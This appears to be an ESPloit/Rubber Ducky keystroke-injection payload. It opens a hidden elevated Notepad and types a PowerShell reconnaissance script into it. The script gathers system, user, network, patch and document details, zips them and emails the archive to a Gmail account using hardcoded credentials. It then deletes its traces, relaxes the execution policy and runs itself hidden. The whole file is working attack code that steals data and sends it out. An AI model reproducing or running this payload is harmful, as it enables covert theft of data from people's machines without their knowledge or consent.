Rem:Generated by Dckuino.js by NURRL
Rem:Modified for use with ESPloit by Corey Harding
Rem:-----
CustomDelay:750
Press:131+114
CustomDelay:1000
Print:powershell Start-Process notepad -Verb runAs
Press:176
CustomDelay:750
Press:130+121
CustomDelay:750
Press:176
Press:130+32
CustomDelay:1000
Print:m
CustomDelay:1000
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:176
Print:$folderDateTime = (get-date).ToString('d-M-y HHmmss')
Press:176
Print:$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ducky Report ' + $folderDateTime
Press:176
Print:$fileSaveDir = New-Item  ($userDir) -ItemType Directory
Press:176
Print:$date = get-date
Press:176
Print:$style = \"&lt;style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} &lt;/style>\"
Press:176
Print:$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'
Press:176
Print:$Report = $Report + \"&lt;div id=body>&lt;h1>Duck Tool Kit Report&lt;/h1>&lt;hr size=2>&lt;br>&lt;h3> Generated on: $Date &lt;/h3>&lt;br>\"
Press:176
Print:$SysBootTime = Get-WmiObject Win32_OperatingSystem
Press:176
Print:$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime
Press:176
Print:$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)
Press:176
Print:$SerialNo = $SysSerialNo.SerialNumber
Press:176
Print:$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model
Press:176
Print:$SysManufacturer = $SysInfo.Manufacturer
Press:176
Print:$SysModel = $SysInfo.Model
Press:176
Print:$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption
Press:176
Print:$disk = Get-WmiObject Win32_LogicalDisk -Filter \"DeviceID='C:'\"
Press:176
Print:$HD = [math]::truncate($disk.Size / 1GB)
Press:176
Print:$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)
Press:176
Print:$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize
Press:176
Print:$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)
Press:176
Print:$SysCpu = Get-WmiObject Win32_Processor | Select Name
Press:176
Print:$Cpu = $SysCpu.Name
Press:176
Print:$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber
Press:176
Print:$HardSerialNo = $HardSerial.SerialNumber
Press:176
Print:$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name
Press:176
Print:$graphicsCard = gwmi win32_VideoController |select Name
Press:176
Print:$graphics = $graphicsCard.Name
Press:176
Print:$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1
Press:176
Print:$DriveLetter = $CDDrive.Drive
Press:176
Print:$DriveName = $CDDrive.Caption
Press:176
Print:$Disk = $DriveLetter + '\\' + $DriveName
Press:176
Print:$Firewall = New-Object -com HNetCfg.FwMgr
Press:176
Print:$FireProfile = $Firewall.LocalPolicy.CurrentProfile
Press:176
Print:$FireProfile = $FireProfile.FirewallEnabled
Press:176
Print:$Report = $Report  + \"&lt;div id=left>&lt;h3>Computer Information&lt;/h3>&lt;br>&lt;table>&lt;tr>&lt;td>Operating System&lt;/td>&lt;td>$OS&lt;/td>&lt;/tr>&lt;tr>&lt;td>OS Serial Number:&lt;/td>&lt;td>$SerialNo&lt;/td>&lt;/tr>&lt;tr>&lt;td>Current User:&lt;/td>&lt;td>$env:USERNAME &lt;/td>&lt;/tr>&lt;tr>&lt;td>System Uptime:&lt;/td>&lt;td>$BootTime&lt;/td>&lt;/tr>&lt;tr>&lt;td>System Manufacturer:&lt;/td>&lt;td>$SysManufacturer&lt;/td>&lt;/tr>&lt;tr>&lt;td>System Model:&lt;/td>&lt;td>$SysModel&lt;/td>&lt;/tr>&lt;tr>&lt;td>Serial Number:&lt;/td>&lt;td>$HardSerialNo&lt;/td>&lt;/tr>&lt;tr>&lt;td>Firewall is Active:&lt;/td>&lt;td>$FireProfile&lt;/td>&lt;/tr>&lt;/table>&lt;/div>&lt;div id=right>&lt;h3>Hardware Information&lt;/h3>&lt;table>&lt;tr>&lt;td>Hardrive Size:&lt;/td>&lt;td>$HD GB&lt;/td>&lt;/tr>&lt;tr>&lt;td>Hardrive Free Space:&lt;/td>&lt;td>$FreeSpace GB&lt;/td>&lt;/tr>&lt;tr>&lt;td>System RAM:&lt;/td>&lt;td>$Ram GB&lt;/td>&lt;/tr>&lt;tr>&lt;td>Processor:&lt;/td>&lt;td>$Cpu&lt;/td>&lt;/tr>&lt;td>CD Drive:&lt;/td>&lt;td>$Disk&lt;/td>&lt;/tr>&lt;tr>&lt;td>Graphics Card:&lt;/td>&lt;td>$graphics&lt;/td>&lt;/tr>&lt;/table>&lt;/div>\"
Press:176
Print: $u = 0
Press:176
Print:$allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)
Press:176
Print:$Report =  $Report + '&lt;div id=right>&lt;h3>USB Devices&lt;/h3>&lt;table>'
Press:176
Print:do {
Press:176
Print:$gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)
Press:176
Print:$Report = $Report + \"&lt;tr>&lt;td>Drive Name: &lt;/td>&lt;td> \" + $allUsb[$u].Name + $allUsb[$u].Label + \"&lt;/td>&lt;td>Free Space: &lt;/td>&lt;td>\" + $gbUSB + \"GB&lt;/td>&lt;/tr>\"
Press:176
Print:Write-Output $fullUSB
Press:176
Print:$u ++
Press:176
Print:} while ($u -lt $allUsb.Count)
Press:176
Print:$Report = $Report + '&lt;/table>&lt;/div>'
Press:176
Print:$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired
Press:176
Print:$UserType = $UserInfo.AccountType
Press:176
Print:$UserSid = $UserInfo.SID
Press:176
Print:$UserPass = $UserInfo.PasswordRequired
Press:176
Print:$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
Press:176
Print:$Report =  $Report + \"&lt;div id=left>&lt;h3>User Information&lt;/h3>&lt;br>&lt;table>&lt;tr>&lt;td>Current User Name:&lt;/td>&lt;td>$env:USERNAME&lt;/td>&lt;/tr>&lt;tr>&lt;td>Account Type:&lt;/td>&lt;td> $UserType&lt;/td>&lt;/tr>&lt;tr>&lt;td>User SID:&lt;/td>&lt;td>$UserSid&lt;/td>&lt;/tr>&lt;tr>&lt;td>Account Domain:&lt;/td>&lt;td>$env:USERDOMAIN&lt;/td>&lt;/tr>&lt;tr>&lt;td>Password Required:&lt;/td>&lt;td>$UserPass&lt;/td>&lt;/tr>&lt;tr>&lt;td>Current User is Admin:&lt;/td>&lt;td>$IsAdmin&lt;/td>&lt;/tr>&lt;/table>\"
Press:176
Print:$Report = $Report + '&lt;/div>'
Press:176
Print:$Report =  $Report + '&lt;div id=center>&lt;h3> Installed Updates&lt;/h3>'
Press:176
Print:$Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy)
Press:176
Print:$Report = $Report + '&lt;/div>'
Press:176
Print:$Report =  $Report + '&lt;div id=center>&lt;h3>User Documents (doc,docx,pdf,rar)&lt;/h3>'
Press:176
Print:$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime)
Press:176
Print:$Report = $Report + '&lt;/div>'
Press:176
Print:$Report =  $Report + '&lt;div id=center>&lt;h3>Network Information&lt;/h3>'
Press:176
Print:$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
Press:176
Print:$Report = $Report + '&lt;/table>&lt;/div>'
Press:176
Print:$Report >> $fileSaveDir'/ComputerInfo.html'
Press:176
Print:function copy-ToZip($fileSaveDir){
Press:176
Print:$srcdir = $fileSaveDir
Press:176
Print:$zipFile = 'C:\\Windows\\Report.zip'
Press:176
Print:if(-not (test-path($zipFile))) {
Press:176
Print:set-content $zipFile (\"PK\" + [char]5 + [char]6 + (\"$([char]0)\" * 18))
Press:176
Print:(dir $zipFile).IsReadOnly = $false}
Press:176
Print:$shellApplication = new-object -com shell.application
Press:176
Print:$zipPackage = $shellApplication.NameSpace($zipFile)
Press:176
Print:$files = Get-ChildItem -Path $srcdir
Press:176
Print:foreach($file in $files) {
Press:176
Print:$zipPackage.CopyHere($file.FullName)
Press:176
Print:while($zipPackage.Items().Item($file.name) -eq $null){
Press:176
Print:Start-sleep -seconds 1 }}}
Press:176
Print:copy-ToZip($fileSaveDir)
Press:176
Print:try {
Press:176
Print:$Sender = 'dksauto2@gmail.com'
Press:176
Print:$Recipient = 'dksauto2@gmail.com'
Press:176
Print:$pass = ConvertTo-SecureString '1DuckyScript!' -AsPlainText -Force
Press:176
Print:$creds = New-Object System.Management.Automation.PSCredential($sender.Split(\"@\")[0], $pass)
Press:176
Print:Send-MailMessage -From $Sender -To $Recipient -Subject \"DuckToolkit Report\" -Body \"Please find attached the DuckToolkit reconnaissance report.\" -SmtpServer \"smtp.gmail.com\" -UseSSL -credential $creds -Attachments \"C:\\Windows\\Report.zip\"}
Press:176
Print:catch {
Press:176
Print:break }
Press:176
Print:remove-item $fileSaveDir -recurse
Press:176
Print:remove-item 'C:\\Windows\\Report.zip'
Press:176
Print:Remove-Item $MyINvocation.InvocationName
Press:176
Press:128+115
CustomDelay:1000
Print:C:\\Windows\\ds.ps1
Press:176
CustomDelay:1000
Press:130+197
CustomDelay:750
Press:131+114
CustomDelay:1000
Print:powershell Start-Process cmd -Verb runAs
Press:176
CustomDelay:750
Press:130+121
CustomDelay:750
Print:mode con:cols=14 lines=1
Press:176
Press:130+32
CustomDelay:1000
Print:m
CustomDelay:1000
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:217
Press:176
Print:powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
Press:176
CustomDelay:750
Print:powershell.exe -windowstyle hidden -File C:\\Windows\\ds.ps1
Press:176